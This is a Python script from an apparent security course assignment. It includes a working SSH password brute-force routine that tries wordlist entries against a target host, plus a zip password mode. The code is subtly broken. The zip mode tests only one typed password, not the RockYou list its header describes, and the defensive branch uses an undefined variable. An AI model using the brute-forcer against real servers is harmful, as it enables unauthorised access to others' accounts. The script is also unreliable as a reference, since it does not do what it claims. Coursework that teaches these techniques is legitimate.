#!/usr/bin/env python3

# Script:                        Ops 401 Challenge 16
# Author:                        Alex Wise
# Date of latest revision:       02/08/2023
# Purpose:                       Brute Force Wordlist attack pt3

        # Task
            # Add to your Python brute force tool the capability to:
                # Use the zipfile library.
                # Pass it the RockYou.txt list to test all words in the list against the password-locked zip file.


# Main 

# Import Libraries 
import paramiko
import time
import zipfile

# Define a function to handle the offensive mode
def offensive_mode(ip, username, file_path, delay):
    # Create an instance of the SSHClient
    ssh = paramiko.SSHClient()
    # Set the missing host key policy to AutoAddPolicy
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # Open the word list file
    with open(file_path, "r") as f:
        # Read each line of the file
        for line in f:
            # Strip the newline character from each line
            password = line.strip()
            # Try to connect to the SSH server with the current password
            try:
                ssh.connect(ip, username=username, password=password)
                print("Login successful!")
                break
            except:
                # Print the value of the password
                print(password)
                # Sleep for the specified delay
                time.sleep(delay)

    # Close the connection
    ssh.close()

# Define a function to handle the defensive mode
def defensive_mode(ip, username, file_path, user_input):
    # Create an instance of the SSHClient
    ssh = paramiko.SSHClient()
    # Set the missing host key policy to AutoAddPolicy
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # Try to connect to the SSH server with the user input as password
    try:
        ssh.connect(ip, username=username, password=user_input)
        print("Password Accepted")
    except:
        print("Wrong Password")

    # Close the connection
    ssh.close()

# Define a function to handle the zipfile brute attack 
def zip_mode(file_path, password):
    try:
        with zipfile.ZipFile(file_path, 'r') as zip_ref:
            zip_ref.extractall(pwd=password.encode('utf-8'))
        print("Zip file extracted successfully")
    except:
        print("Wrong Password")


# Ask the user to choose a mode
mode = input("Which mode? (Offensive/Defensive or Zip): ")

# Ask the user for the SSH server IP address
ip = input("Enter the SSH server IP address: ")

# Ask the user for the username
username = input("Enter the username: ")

# Handle the mode selected by the user
if mode.lower() == "offensive":
    # Ask the user for the file path
    file_path = input("Enter the word list file path: ")
    # Ask the user for the delay
    delay = float(input("Enter the delay (in seconds): "))
    # Call the offensive mode function
    offensive_mode(ip, username, file_path, delay)

elif mode.lower() == "defensive":
    # Ask the user for the user input
    user_input = input("Enter the password: ")
    # Call the defensive mode function
    defensive_mode(ip, username, file_path, user_input)
    
elif mode.lower() == "zip":
    # Ask the user for the file path
    file_path = input("Enter the zip file path: ")
    # Ask the user for the password
    password = input("Enter the password: ")
    # Call the zip mode function
    zip_mode(file_path, password)
else:
    # If the user selects an invalid mode, display an error message
    print("Invalid mode selected")

# End 